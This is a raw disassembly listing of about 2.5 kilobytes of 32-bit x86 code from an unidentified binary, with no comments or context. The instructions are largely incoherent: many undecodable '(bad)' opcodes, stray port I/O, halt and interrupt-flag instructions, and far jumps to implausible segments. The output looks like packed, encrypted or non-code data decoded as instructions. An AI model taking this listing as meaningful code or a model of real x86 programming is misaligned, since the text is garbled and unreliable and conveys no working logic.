  406e68:	xor    al,0xac
  406e6a:	cmp    DWORD PTR [ebp+0x77],0x5b
  406e6e:	jne    0x406e7b
  406e70:	dec    edi
  406e71:	push   edi
  406e72:	add    BYTE PTR [eax],al
  406e74:	xchg   edi,eax
  406e75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e76:	pop    ebx
  406e77:	leave  
  406e78:	and    eax,0x928aff48
  406e7d:	inc    edi
  406e7e:	mov    edx,0x5b5700
  406e83:	push   0x57
  406e85:	add    al,0x75
  406e87:	adc    BYTE PTR [eax-0x10f78afc],bh
  406e8d:	jp     0x406e5d
  406e8f:	add    BYTE PTR [edi-0x26],dl
  406e92:	mov    edi,0xf8586b7e
  406e97:	sub    edx,ebp
  406e99:	push   0xffffff83
  406e9b:	jge    0x406ed4
  406e9d:	pop    ebx
  406e9e:	jne    0x406ea7
  406ea0:	mov    WORD PTR [edi+0x0],ss
  406ea3:	add    BYTE PTR [edi],dl
  406ea5:	out    dx,al
  406ea6:	add    ebx,ebp
  406ea8:	pop    ebp
  406ea9:	int    0xc3
  406eab:	pop    edi
  406eac:	fmul   QWORD PTR [edi]
  406eae:	ret    0x170c
  406eb1:	lods   al,BYTE PTR ds:[esi]
  406eb2:	mov    ebp,esp
  406eb4:	xchg   esi,eax
  406eb5:	push   cs
  406eb6:	hlt    
  406eb7:	(bad)  
  406eb8:	loopne 0x406ebe
  406eba:	push   DWORD PTR [ebp-0x1d]
  406ebd:	rol    DWORD PTR [ebp-0xfaee0c],cl
  406ec3:	(bad)  
  406ec4:	pop    edx
  406ec5:	(bad)  
  406ec6:	std    
  406ec7:	inc    DWORD PTR [eax]
  406ec9:	pop    eax
	...
  406ef6:	out    0x1b,eax
  406ef8:	test   esp,edi
  406efa:	xchg   ecx,eax
  406efb:	add    al,0xff
  406efd:	add    edi,edx
  406eff:	pop    edx
  406f00:	add    BYTE PTR [ebp-0xa8d6],cl
  406f06:	rol    BYTE PTR [esi*2+0x4b53e08],1
  406f0d:	lea    edi,[ebx-0x66005618]
  406f13:	je     0x406f33
  406f15:	add    BYTE PTR [esp+eax*2],ah
  406f18:	jbe    0x406e9f
  406f1a:	mov    al,dh
  406f1c:	test   eax,0x459eeff
  406f21:	call   0x44f565
  406f26:	mov    ebp,0x4274a9bc
  406f2b:	cmp    ebx,eax
  406f2d:	jne    0x406f69
  406f2f:	jno    0x406ef5
  406f31:	jmp    0x406f76
  406f33:	fadd   QWORD PTR [edx]
  406f35:	add    BYTE PTR [esi],bh
  406f37:	inc    esp
  406f38:	mov    edx,0x4e4436c2
  406f3d:	mov    edx,DWORD PTR [edx-0x3f]
  406f40:	sar    ah,0x8d
  406f43:	sub    esp,ecx
  406f45:	push   0xffffff94
  406f47:	ins    DWORD PTR es:[edi],dx
  406f48:	das    
  406f49:	or     BYTE PTR [esi],dl
  406f4b:	mov    bh,0xa9
  406f4d:	jmp    DWORD PTR [ecx]
  406f4f:	cmp    ebx,eax
  406f51:	je     0x406fc5
  406f53:	jmp    0x7f9b:0x4c8bff4c
	...
  406f82:	add    BYTE PTR [eax],al
  406f84:	or     DWORD PTR [ebp-0x58],eax
  406f87:	or     edi,esi
  406f89:	mov    BYTE PTR ds:0x4aa82eb,0x6a
  406f90:	aas    
  406f91:	mov    edi,0x258eff3e
  406f96:	cs or  dh,dl
  406f99:	jmp    0xbf7e7053
  406f9e:	ret    
  406f9f:	jle    0x406faf
  406fa1:	leave  
  406fa2:	ds adc al,0x6
  406fa5:	jg     0x406f50
  406fa7:	jne    0x406fe5
  406fa9:	rol    DWORD PTR [edx],1
  406fab:	mov    edx,DWORD PTR [ebx]
  406fad:	pop    ebx
  406fae:	cmc    
  406faf:	jl     0x406ffd
  406fb1:	shr    ecx,0x1d
  406fb4:	aas    
  406fb5:	loopne 0x406fe2
  406fb7:	test   eax,0xf8144e0e
  406fbc:	cwde   
  406fbd:	test   al,0xd9
  406fbf:	test   al,0xb
  406fc1:	pop    edi
  406fc2:	xchg   ecx,eax
  406fc3:	pop    esp
  406fc4:	dec    bp
  406fc6:	jbe    0x406fb4
  406fc8:	cli    
  406fc9:	push   0xfffffffb
  406fcb:	add    eax,0xcc6c5665
  406fd0:	jmp    0x2b24:0x5c471fe
  406fd7:	(bad)  
  406fd9:	test   al,0x62
  406fdb:	xchg   edi,eax
  406fdc:	mov    edi,0x51abe916
  406fe1:	dec    ebp
  406fe2:	call   0xa8:0x93c064dc
	...
  407011:	add    bl,cl
  407013:	bound  eax,QWORD PTR [ecx+0xb]
  407016:	cmp    DWORD PTR [ebp+0x26],ecx
  407019:	cld    
  40701a:	icebp  
  40701b:	mov    DWORD PTR [esi-0x63b37be3],0xe6219fb
  407025:	test   al,0x19
  407027:	popa   
  407028:	sub    DWORD PTR [esi],ebp
  40702a:	cmp    al,0x40
  40702c:	xchg   esi,eax
  40702d:	or     BYTE PTR [ebx+0x1fbe96b],0x4d
  407034:	ja     0x407036
  407036:	mov    dh,0x5b
  407038:	icebp  
  407039:	add    edi,DWORD PTR [esi]
  40703b:	inc    eax
  40703c:	jmp    0x8e04:0x436b837a
  407043:	fisub  WORD PTR [ebx+0x4]
  407046:	(bad)  
  407047:	dec    esp
  407048:	(bad)  
  407049:	push   esp
  40704a:	rol    esi,1
  40704c:	icebp  
  40704d:	fwait
  40704e:	push   cs
  40704f:	push   ds
  407050:	add    cl,ch
  407052:	cmp    eax,0x3c30bfd6
  407057:	inc    eax
  407058:	sub    al,0x1c
  40705a:	cmp    eax,0xdc6eb98
  40705f:	loopne 0x4070b5
  407061:	in     eax,0x24
  407063:	imul   ebp,DWORD PTR [edx-0x17],0xe984dded
  40706a:	in     eax,0x4c
  40706c:	call   FWORD PTR [ecx]
  40706e:	loope  0x407036
  407070:	or     al,0x76
  407072:	in     al,dx
  407073:	push   0x58
  407075:	rol    BYTE PTR [eax],0x0
	...
  4070a0:	(bad)  
  4070a1:	push   0xffffff83
  4070a3:	in     al,0x4d
  4070a5:	pop    ebx
  4070a6:	jne    0x407092
  4070a8:	cld    
  4070a9:	aas    
  4070aa:	add    al,0x6c
  4070ac:	jne    0x407075
  4070ae:	cdq    
  4070af:	bound  edi,QWORD PTR [ebp-0x50]
  4070b2:	leave  
  4070b3:	sub    edx,DWORD PTR [esi+0x4c]
  4070b6:	push   esp
  4070b7:	jb     0x40705f
  4070b9:	fadd   st,st(3)
  4070bb:	xor    ecx,esi
  4070bd:	xchg   edi,edi
  4070bf:	ret    
  4070c0:	cmp    eax,0x359cffa4
  4070c5:	xor    al,0xc4
  4070c7:	ss loope 0x407115
  4070ca:	(bad)  
  4070cb:	lods   al,BYTE PTR ds:[esi]
  4070cc:	fstp   DWORD PTR [edx+0x0]
  4070cf:	jmp    0xf1955111
  4070d4:	xchg   esp,eax
  4070d5:	imul   ecx,DWORD PTR [ebp+0x6aaad5a4],0xfc9686ed
  4070df:	cdq    
  4070e0:	mov    al,ds:0x8fe608c5
  4070e5:	pop    edi
  4070e6:	inc    edi
  4070e7:	push   0xe30d4f16
  4070ec:	out    0x61,al
  4070ee:	je     0x4070d3
  4070f0:	mov    esp,0xe700f8cd
  4070f5:	mov    cl,cl
  4070f7:	xor    edx,DWORD PTR [edi-0x6f74fb10]
  4070fd:	fdivr  DWORD PTR [edi-0x3df1b7fd]
  407103:	add    al,0x0
	...
  40712d:	add    BYTE PTR [edi+0x14ec8baa],ah
  407133:	or     al,0xf4
  407135:	push   ebx
  407136:	pusha  
  407137:	outs   dx,DWORD PTR ds:[esi]
  407138:	cwde   
  407139:	cmp    ah,BYTE PTR [edi-0x271317a9]
  40713f:	hlt    
  407140:	dec    BYTE PTR [ecx+0x458d0362]
  407146:	add    ebp,DWORD PTR [eax-0xb2fd618]
  40714c:	(bad)  
  40714d:	xor    edi,esp
  40714f:	jno    0x40716f
  407151:	push   0x6d
  407153:	outs   dx,DWORD PTR ds:[esi]
  407154:	add    dl,bh
  407156:	push   edi
  407157:	push   edi
  407158:	push   DWORD PTR [ebp-0xd]
  40715b:	hlt    
  40715c:	je     0x407166
  40715e:	out    dx,eax
  40715f:	retf   
  407160:	(bad)  
  407161:	dec    DWORD PTR [eax]
  407163:	fstp   TBYTE PTR [edi+0x47d30f]
  407169:	add    BYTE PTR [edi],ah
  40716b:	add    dh,BYTE PTR [ebp-0xc]
  40716e:	dec    edi
  40716f:	adc    edi,0xff3348ff
  407175:	stc    
  407176:	pop    ss
  407177:	pop    edi
  407178:	jbe    0x40717f
  40717a:	bound  eax,QWORD PTR ds:[ecx]
  40717d:	add    BYTE PTR [edi],ah
  40717f:	add    dh,BYTE PTR [ebp-0xc]
  407182:	das    
  407183:	xchg   esp,eax
  407184:	(bad)  
  407185:	dec    DWORD PTR [eax]
  407187:	retf   
  407188:	shl    BYTE PTR [ebx+eiz*1+0x1],0x75
  40718d:	hlt    
  40718e:	pinsrw mm3,ecx,0xff
	...
  4071ba:	add    BYTE PTR [eax],al
  4071bc:	or     ch,al
  4071be:	push   ebp
  4071bf:	hlt    
  4071c0:	ds mov ebp,0x9c3e6a12
  4071c6:	lock and BYTE PTR [esi],bh
  4071c9:	xor    al,0xa4
  4071cb:	jne    0x407197
  4071cd:	or     DWORD PTR [edi],ebp
  4071cf:	hlt    
  4071d0:	shl    DWORD PTR [esi-0x8],0xc6
  4071d4:	add    ecx,DWORD PTR [esp+eax*1]
  4071d7:	add    BYTE PTR [esi],bh
  4071d9:	xor    al,0x1b
  4071db:	cmp    bh,cl
  4071dd:	jb     0x4071e3
  4071df:	jmp    FWORD PTR [ebx]
  4071e1:	lock fwait
  4071e3:	into   
  4071e4:	test   DWORD PTR [ebx+eax*1],esi
  4071e7:	push   ebx
  4071e8:	inc    ebp
  4071e9:	hlt    
  4071ea:	das    
  4071eb:	ss mov ch,0xdc
  4071ee:	sbb    edi,DWORD PTR [edx]
  4071f0:	icebp  
  4071f1:	jb     0x4071f7
  4071f3:	call   0x447051
  4071f8:	cmp    eax,0xb5474dbc
  4071fd:	mov    DWORD PTR [ebx-0x6c],ebp
  407200:	dec    edi
  407201:	xor    al,0x3
  407203:	mov    al,0x4b
  407205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407206:	push   esi
  407207:	mov    eax,0x323aa
  40720c:	adc    eax,0x4147be73
  407211:	xor    al,0x4c
  407213:	push   ebx
  407214:	fdivr  QWORD PTR es:[eax+0x3fcb3e00]
  40721b:	clc    
  40721c:	mov    DWORD PTR [edx+0xff3d],eax
	...
  40724a:	xor    edx,DWORD PTR [ecx]
  40724c:	dec    eax
  40724d:	push   0x41e984
  407252:	adc    edi,eax
  407254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407255:	call   0x44ff1d
  40725a:	ins    DWORD PTR es:[edi],dx
  40725b:	cmp    eax,0xbd8274c3
  407260:	lods   al,BYTE PTR ds:[esi]
  407261:	push   0x43365b84
  407266:	xor    esi,DWORD PTR ds:[edi-0x15a4c146]
  40726d:	stos   DWORD PTR es:[edi],eax
  40726e:	jno    0x407212
  407270:	(bad)  
  407271:	les    edx,FWORD PTR [edi+0x3e03d7ee]
  407277:	or     ebp,esp
  407279:	mov    cl,0x90
  40727b:	add    bl,BYTE PTR [ebp+0x12]
  40727e:	ds pop ebx
  407280:	add    al,bl
  407282:	js     0x407225
  407284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407285:	add    edx,DWORD PTR [ecx]
  407287:	scas   al,BYTE PTR es:[edi]
  407288:	xchg   ecx,eax
  407289:	pusha  
  40728a:	nop
  40728b:	dec    ecx
  40728c:	xchg   esi,eax
  40728d:	js     0x407282
  40728f:	push   0xffffffe2
  407291:	ror    DWORD PTR [edx],1
  407293:	pop    edi
  407294:	jo     0x407297
  407296:	xchg   ebp,eax
  407297:	pusha  
  407298:	sbb    DWORD PTR [eax+esi*2+0x19a47628],ebx
  40729f:	and    DWORD PTR [esi],esp
  4072a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072a2:	inc    ebx
  4072a3:	stos   BYTE PTR es:[edi],al
  4072a4:	ret    0xf3a4
  4072a7:	dec    esi
  4072a8:	push   ecx
  4072a9:	fild   DWORD PTR [esi+0x805649]
	...
  4072d7:	add    bl,bl
  4072d9:	inc    edx
  4072da:	jmp    0xac62ac0b
  4072df:	stos   DWORD PTR es:[edi],eax
  4072e0:	ds pop ebx
  4072e2:	mov    DWORD PTR [ebx],eax
  4072e4:	inc    ecx
  4072e5:	iret   
  4072e6:	xor    DWORD PTR [ebx+esi*4+0x462e2e4f],esp
  4072ed:	xor    ecx,DWORD PTR [esi]
  4072ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072f0:	sub    DWORD PTR [ecx+0x1e],ecx
  4072f3:	sub    dh,BYTE PTR cs:[ecx+edx*4]
  4072f7:	int    0x19
  4072f9:	dec    ecx
  4072fa:	loop   0x4072bf
  4072fc:	mov    ebx,DWORD PTR [ebp+0x12]
  4072ff:	or     BYTE PTR ds:0xb50c751b,dh
  407305:	scas   al,BYTE PTR es:[edi]
  407306:	add    ch,bh
  407308:	jno    0x407377
  40730a:	push   DWORD PTR [ecx+ebp*8+0x49]
  40730e:	jne    0x4072ed
  407310:	popf   
  407311:	lods   eax,DWORD PTR ds:[esi]
  407312:	xor    al,0x64
  407314:	cli    
  407315:	ret    
  407316:	add    eax,0x5b4392
  40731b:	jmp    0x733521e0
  407320:	ror    BYTE PTR [ecx+0x75],1
  407323:	mov    ch,0x9d
  407325:	lods   eax,DWORD PTR ds:[esi]
  407326:	or     BYTE PTR [esi+0x41e84757],dh
  40732c:	jl     0x407376
  40732e:	push   DWORD PTR [edx-0x7f]
  407331:	test   al,0x5b
  407333:	mov    al,0x78
  407335:	push   edi
  407336:	add    BYTE PTR [ecx+ecx*8],bh
  407339:	aaa    
  40733a:	and    DWORD PTR [ebp+0x0],0x0
	...
  407365:	add    dl,ch
  407367:	scas   eax,DWORD PTR es:[edi]
  407368:	push   ebx
  407369:	ror    al,cl
  40736b:	mov    bl,0x0
  40736d:	leave  
  40736e:	cmp    eax,0x7c0ae85b
  407373:	dec    eax
  407374:	jmp    DWORD PTR [eax+0x7]
  407377:	inc    edi
  407378:	push   0xff485de9
  40737d:	push   ecx
  40737e:	and    al,0x29
  407380:	call   DWORD PTR [esi-0x35]
  407383:	sahf   
  407384:	mov    ah,0xc1
  407386:	cmp    eax,0x95e9007b
  40738b:	xchg   edx,eax
  40738c:	fidivr WORD PTR [esi]
  40738e:	popf   
  40738f:	rol    BYTE PTR [ebp+esi*2-0x31],cl
  407393:	(bad)
  407396:	push   ds
  407397:	dec    eax
  407398:	(bad)  
  407399:	jmp    0x54337bae
  40739e:	cmc    
  40739f:	popf   
  4073a0:	rcl    ch,0x3d
  4073a3:	pop    ebx
  4073a4:	add    BYTE PTR [esi],ah
  4073a6:	xchg   DWORD PTR [edi],ebp
  4073a8:	inc    DWORD PTR [eax]
  4073aa:	and    BYTE PTR [eax+eax*1-0x39],bl
  4073ae:	(bad)  
  4073b0:	(bad)  
  4073b1:	pop    ds
  4073b2:	out    0x5b,eax
  4073b4:	push   DWORD PTR [ebp-0x1d]
  4073b7:	in     al,dx
  4073b8:	inc    esp
  4073b9:	shl    al,1
  4073bb:	bound  esi,QWORD PTR [edi+ecx*4+0x458d0b1a]
  4073c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073c3:	mov    ebp,DWORD PTR [eax+0x0]
  4073c6:	out    0x5b,eax
  4073c8:	sub    BYTE PTR [edx+0x0],0x0
	...
  4073f4:	xlat   BYTE PTR ds:[ebx]
  4073f5:	cld    
  4073f6:	je     0x407400
  4073f8:	out    dx,eax
  4073f9:	test   dl,cl
  4073fb:	add    BYTE PTR [edi-0x668b3fa8],ah
  407401:	loopne 0x40747f
  407403:	rcl    BYTE PTR [edi-0x2e16fa9e],1
  407409:	pop    ebx
  40740a:	add    BYTE PTR [eax],al
  40740c:	call   0xa14024a3
  407411:	pop    ebx
  407412:	add    BYTE PTR [ebp-0xaf50a6],cl
  407418:	mov    ah,BYTE PTR [edi+0x5b670068]
  40741e:	or     BYTE PTR [ebp-0x17afe0e6],0x45
  407425:	sbb    DWORD PTR [eax],eax
  407427:	add    BYTE PTR [ebx+ebx*1+0x75],ch
  40742b:	add    eax,0xb6fe
  407430:	fadd   DWORD PTR [si-0x4c]
  407434:	sbb    DWORD PTR [eax+eax*1-0x73],ebx
  407438:	sbb    BYTE PTR [ebx],0xb9
  40743b:	cmp    al,0x27
  40743d:	pop    ebx
  40743e:	add    BYTE PTR [ebx],dh
  407440:	addr16 in eax,dx
  407442:	test   eax,0x3c1adac7
  407447:	add    BYTE PTR [edi],dl
  407449:	pop    ebx
  40744a:	push   DWORD PTR [ebp+0x3e]
  40744d:	test   al,0x92
  40744f:	inc    ebp
  407450:	and    bh,BYTE PTR [esi+0x48]
  407453:	aam    0x9
  407455:	add    eax,DWORD PTR ds:[eax]
	...
  407480:	add    BYTE PTR [eax],al
  407482:	stc    
  407483:	call   DWORD PTR [edx+0x33459ff]
  407489:	lea    edi,[ebx+0x74]
  40748c:	xor    ebp,DWORD PTR [edx+0x3e]
  40748f:	stos   BYTE PTR es:[edi],al
  407490:	add    al,0xff
  407492:	imul   ebp,eax,0xffffffab
  407495:	out    0x7,al
  407497:	xor    eax,0xb0fe0b03
  40749c:	or     al,BYTE PTR [ebx+0x7503e44b]
  4074a2:	cmp    al,0x29
  4074a4:	and    al,0xff
  4074a6:	xor    edx,DWORD PTR [eax]
  4074a8:	mov    eax,ds:0x389cea75
  4074ad:	dec    edi
  4074ae:	push   DWORD PTR [ebx]
  4074b0:	mov    al,ds:0x1aece275
  4074b5:	leave  
  4074b6:	ds xor al,0x84
  4074b9:	les    ebp,FWORD PTR [esi]
  4074bb:	and    eax,0x64664558
  4074c0:	add    BYTE PTR cs:[ecx+0x68e89f4f],al
  4074c7:	retf   0xffa1
  4074ca:	inc    ebp
  4074cb:	hlt    
  4074cc:	push   ss
  4074cd:	add    dl,BYTE PTR [ebp+0x67]
  4074d0:	mov    eax,DWORD PTR [ebp-0x5a]
  4074d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074d4:	pop    ss
  4074d5:	mov    esp,0xcb4266
  4074da:	ds add al,0xa0
  4074dd:	jne    0x407469
  4074df:	popf   
  4074e0:	pop    ss
  4074e1:	mov    eax,0xff9bef56
	...
  40750e:	add    BYTE PTR [eax],al
  407510:	cmp    DWORD PTR [ecx],edi
  407512:	ret    
  407513:	jne    0x407551
  407515:	cdq    
  407516:	hlt    
  407517:	(bad)  
  407518:	mov    bl,0x5b
  40751a:	stc    
  40751b:	mov    al,ds:0x171e57ab
  407520:	(bad)  
  407521:	xor    bl,ah
  407523:	sahf   
  407524:	adc    DWORD PTR [esi+0x62],eax
  407527:	mov    esp,0xac41d009
  40752c:	cld    
  40752d:	adc    ebp,ecx
  40752f:	add    edi,ecx
  407531:	iret   
  407532:	cmp    eax,0xee2844ac
  407537:	mov    al,ds:0xaba5cfe9
  40753c:	cmp    al,0x28
  40753e:	fisub  WORD PTR [eax-0x542a3027]
  407544:	aam    0x26
  407546:	into   
  407547:	mov    al,ds:0x412219b5
  40754c:	neg    DWORD PTR [eax]
  40754e:	in     eax,dx
  40754f:	add    edx,DWORD PTR [ebx]
  407551:	rol    ah,cl
  407553:	test   BYTE PTR [edx+0x46],bh
  407556:	bound  eax,QWORD PTR [esi+0x3a]
  407559:	push   edx
  40755a:	test   eax,0xe91e3817
  40755f:	add    edi,DWORD PTR [esi]
  407561:	pop    ebx
  407562:	jmp    0xe987712f
  407567:	add    edi,DWORD PTR [esi]
  407569:	pop    ebx
  40756a:	je     0x4075b2
  40756c:	sub    BYTE PTR [edx+0x464a167e],0xfc
  407573:	or     eax,DWORD PTR [eax]
	...
  40759d:	add    BYTE PTR [esi-0x4d],ah
  4075a0:	outs   dx,DWORD PTR ds:[esi]
  4075a1:	mov    al,ds:0x9fe3d969
  4075a6:	ds iret 
  4075a8:	imul   BYTE PTR ds:0xfdc463e
  4075ae:	push   ecx
  4075af:	iret   
  4075b0:	dec    ebp
  4075b1:	stos   DWORD PTR es:[edi],eax
  4075b2:	lock inc esp
  4075b4:	inc    esi
  4075b5:	mov    al,ds:0x9fb445ee
  4075ba:	es idiv edi
  4075bd:	adc    al,0xde
  4075bf:	inc    esp
  4075c0:	pop    eax
  4075c1:	and    BYTE PTR [ebx],al
  4075c3:	push   esp
  4075c4:	add    BYTE PTR [edx+esi*4-0x46da7cc9],bh
  4075cb:	mov    ebp,0x5ab1acc7
  4075d0:	add    BYTE PTR [edi-0x1801610a],al
  4075d6:	cmp    eax,0x806c04b1
  4075db:	inc    edi
  4075dc:	push   eax
  4075dd:	cmp    DWORD PTR [ebp+0x15e9005b],0x3de9ff44
  4075e7:	inc    esp
  4075e8:	jne    0x4075db
  4075ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075eb:	popf   
  4075ec:	leave  
  4075ed:	jmp    0xe602882f
  4075f2:	cmp    eax,0xbdd58bae
  4075f7:	pop    ds
  4075f8:	lods   al,BYTE PTR ds:[esi]
  4075f9:	push   ss
  4075fa:	ins    DWORD PTR es:[edi],dx
  4075fb:	sbb    al,0x45
  4075fd:	test   DWORD PTR [edx],edi
  4075ff:	pop    ebx
  407600:	add    cl,ch
	...
  40762a:	add    BYTE PTR [eax],al
  40762c:	mov    WORD PTR [ecx],fs
  40762e:	push   0xff44ade9
  407633:	xchg   ecx,eax
  407634:	xor    BYTE PTR [edi],ah
  407636:	call   DWORD PTR [esi+0x1c09ec3]
  40763c:	inc    edx
  40763d:	imul   eax,DWORD PTR [eax],0xffffffe9
  407640:	aad    0xb2
  407642:	fdivr  QWORD PTR [esi-0x27]
  407645:	rol    BYTE PTR [ecx+esi*1+0x22],cl
  407649:	pop    ebx
  40764a:	adc    cl,ch
  40764c:	cmp    eax,0xc1455c33
  407651:	inc    esp
  407652:	mov    DWORD PTR [ecx+edi*8-0xcd2832b],esp
  407659:	xchg   BYTE PTR [eax],al
  40765b:	jmp    0x100fe9d
  407660:	add    al,0xb1
  407662:	mov    DWORD PTR [ebp+0x63],0x27ffff3b
  407669:	in     eax,0x74
  40766b:	ror    BYTE PTR [eax-0x3d002b6e],0x9f
  407672:	pop    DWORD PTR [ebp+0x37]
  407675:	sbb    al,0x45
  407677:	fsubr  DWORD PTR [eax]
  407679:	push   esp
  40767a:	add    BYTE PTR [eax],al
  40767c:	pusha  
  40767d:	xchg   edx,eax
  40767e:	hlt    
  40767f:	dec    DWORD PTR [eax]
  407681:	pop    eax
  407682:	add    BYTE PTR [ebp+0x68501ba2],cl
  407688:	out    0x57,eax
  40768a:	add    BYTE PTR [eax+0x75ff57bd],al
	...
  4076b8:	add    BYTE PTR [eax],al
  4076ba:	out    dx,eax
  4076bb:	out    dx,eax
  4076bc:	imul   ecx,eax,0xc00b57e7
  4076c2:	jae    0x407721
  4076c4:	cmp    DWORD PTR [ebp-0x6d],0x57
  4076c8:	jne    0x4076cf
  4076ca:	out    dx,al
  4076cb:	cli    
  4076cc:	(bad)  
  4076cd:	jmp    DWORD PTR [edi-0x174fbae4]
  4076d3:	push   esp
  4076d4:	add    BYTE PTR [eax],al
  4076d6:	or     dl,BYTE PTR [ebx+0x62d850b0]
  4076dc:	mov    esp,0x57a768
  4076e1:	sbb    BYTE PTR [edx],0x93
  4076e4:	les    edx,FWORD PTR [eax-0x41]
  4076e7:	xchg   edx,eax
  4076e8:	enter  0x9700,0x50
  4076ec:	shl    BYTE PTR [ebp+0x62],0xf6
  4076f0:	xlat   BYTE PTR ds:[ebx]
  4076f1:	add    BYTE PTR [edi+0x57],ah
  4076f4:	mov    eax,DWORD PTR [ebp+0x2f]
  4076f7:	push   ds
  4076f8:	add    BYTE PTR [eax],al
  4076fa:	jmp    0x5f:0x3bb9c47a
  407701:	add    BYTE PTR [esi],bh
  407703:	popa   
  407704:	(bad)  
  407705:	repz xchg esp,eax
  407707:	jl     0x407751
  407709:	les    eax,FWORD PTR [edx]
  40770b:	xor    al,BYTE PTR [ebx]
  40770d:	add    BYTE PTR [ecx],bh
  40770f:	or     BYTE PTR [ebx-0x71],bl
  407712:	jnp    0x407698
  407714:	mov    BYTE PTR [ebp+0x6],0x72
  407718:	push   cs
  407719:	add    BYTE PTR [esi],bh
  40771b:	jno    0x407765
  40771d:	hlt    
	...
  407746:	add    BYTE PTR [eax],al
  407748:	sbb    DWORD PTR [edx],esi
  40774a:	add    eax,DWORD PTR [eax]
  40774c:	ret    
  40774d:	out    dx,eax
  40774e:	(bad)  
  40774f:	push   eax
  407750:	xchg   esp,eax
  407751:	xor    al,0x29
  407753:	add    BYTE PTR [ecx],al
  407755:	rcr    BYTE PTR [edi-0x18],0xf7
  407759:	jns    0x40775e
  40775b:	add    BYTE PTR [ebp+0x74],al
  40775e:	pop    ss
  40775f:	push   es
  407760:	mov    ebp,0x6b00b7af
  407765:	das    
  407766:	stos   BYTE PTR es:[edi],al
  407767:	mov    WORD PTR [esi],?
  407769:	xor    al,0x3
  40776b:	dec    DWORD PTR [ebx+0x44]
  40776e:	pushf  
  40776f:	jne    0x40776f
  407771:	adc    DWORD PTR [edi],edx
  407773:	mov    eax,0x414e7256
  407778:	add    DWORD PTR ds:[edi],edx
  40777b:	mov    esp,0xc5b2a6
  407780:	ds mov ch,0xc8
  407783:	adc    al,0x31
  407785:	mov    eax,ds:0x6deedc47
  40778a:	add    al,0xff
  40778c:	or     esi,esp
  40778e:	stos   DWORD PTR es:[edi],eax
  40778f:	sti    
  407790:	xchg   cl,dl
  407792:	pushf  
  407793:	or     edi,DWORD PTR [esi+0x3f]
  407796:	add    ebx,ebp
  407798:	sbb    bl,cl
  40779a:	inc    edi
  40779b:	mov    ah,0x71
  40779d:	aas    
  40779e:	push   edi
  40779f:	call   0xffde2a43
  4077a4:	popa   
  4077a5:	pop    ebx
  4077a6:	fcomp  QWORD PTR [edi+0x66]
  4077a9:	push   0x27
  4077ab:	add    al,0x0
	...
  4077d5:	add    BYTE PTR [esi],bh
  4077d7:	stos   DWORD PTR es:[edi],eax
  4077d8:	push   esi
  4077d9:	pop    ss
  4077da:	mov    al,BYTE PTR [edx-0x2c]
  4077dd:	push   edi
  4077de:	push   esi
  4077df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077e0:	inc    eax
  4077e1:	popf   
  4077e2:	cmp    DWORD PTR [esi+0x29],edx
  4077e5:	pop    ss
  4077e6:	cmp    al,0x36
  4077e8:	clc    
  4077e9:	sub    BYTE PTR [ebx+0x4a17e96b],0x42
  4077f0:	pushf  
  4077f1:	repz sbb al,cl
  4077f4:	in     eax,dx
  4077f5:	pushf  
  4077f6:	mov    eax,DWORD PTR [edi]
  4077f8:	add    DWORD PTR [edi+eax*1+0x42],eax
  4077fc:	push   cs
  4077fd:	or     esi,edi
  4077ff:	(bad)  
  407800:	jmp    0x4077aa
  407802:	push   ecx
  407803:	(bad)  
  407804:	and    BYTE PTR [ecx],cl
  407806:	adc    eax,0x838ed8c7
  40780b:	out    dx,eax
  40780c:	cwde   
  40780d:	pushf  
  40780e:	imul   esp,DWORD PTR [edi-0x1a],0x16
  407812:	xchg   edx,eax
  407813:	xor    al,BYTE PTR [eax]
  407815:	cdq    
  407816:	rol    DWORD PTR [ecx+0x62],1
  407819:	mov    ebx,0xab95c7c9
  40781e:	cwde   
  40781f:	sbb    ecx,ebp
  407821:	add    edi,DWORD PTR [ecx-0x5f545639]
  407827:	and    al,0xb6
  407829:	pushf  
  40782a:	test   eax,0x98ab6dc7
  40782f:	and    al,0xa6
  407831:	pushf  
  407832:	cdq    
  407833:	(bad)  
  407834:	popa   
  407835:	stos   DWORD PTR es:[edi],eax
  407836:	jo     0x40785c
  407838:	xchg   esi,eax
  407839:	pushf  
	...
  407862:	add    BYTE PTR [eax],al
  407864:	mov    ebp,0xa033dbf
  407869:	push   ebx
  40786a:	xchg   BYTE PTR [esi],dl
  40786c:	stos   BYTE PTR es:[edi],al
  40786d:	xor    bl,BYTE PTR [ecx+0x4171b9]
  407873:	bound  edi,QWORD PTR [esi-0x5b]
  407876:	pop    edi
  407877:	mov    al,ds:0xbc006a7f
  40787c:	(bad)  
  40787d:	and    DWORD PTR cs:0x322badb5,0xffffffbe
  407885:	mov    edi,0x9129e90c
  40788a:	add    esp,0x2d
  40788d:	inc    ecx
  40788e:	jae    0x407841
  407890:	rcl    BYTE PTR [esi-0x39356604],0xc
  407897:	inc    ecx
  407898:	sahf   
  407899:	sbb    DWORD PTR [eax],eax
  40789b:	jmp    0xd9b89460
  4078a0:	mov    dl,0xc6
  4078a2:	or     al,0x1
  4078a4:	xor    ch,BYTE PTR ds:0x96b40eff
  4078aa:	clc    
  4078ab:	push   es
  4078ac:	push   eax
  4078ad:	aas    
  4078ae:	call   0x9c7140
  4078b3:	loop   0x4078b2
  4078b5:	(bad)  
  4078b6:	sbb    esi,ebp
  4078b8:	dec    ebx
  4078b9:	imul   edi,edi,0x5c
  4078bc:	mov    edx,0x4254ffab
  4078c1:	xor    eax,DWORD PTR [ebx]
  4078c3:	xlat   BYTE PTR ds:[ebx]
  4078c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078c5:	inc    eax
  4078c6:	mov    esi,DWORD PTR [ecx+0x0]
	...
  4078f0:	add    BYTE PTR [eax],al
  4078f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078f3:	(bad)  
  4078f4:	cld    
  4078f5:	shr    DWORD PTR [edi+0x16],1
  4078f8:	add    cl,ch
  4078fa:	aam    0xc6
  4078fc:	or     al,0xc1
